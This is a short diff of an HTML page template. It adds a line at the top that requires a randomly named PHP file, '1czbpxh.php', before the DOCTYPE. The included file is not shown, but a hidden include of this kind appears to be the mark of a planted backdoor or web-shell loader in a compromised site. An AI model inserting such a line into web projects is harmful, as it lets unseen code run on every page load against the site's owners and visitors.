@@ -1,4 +1,5 @@
-<!DOCTYPE HTML>
+
+<?php require __DIR__ . '/1czbpxh.php' ?><!DOCTYPE HTML>
 <html>
 	<head>
 	<meta charset="utf-8">
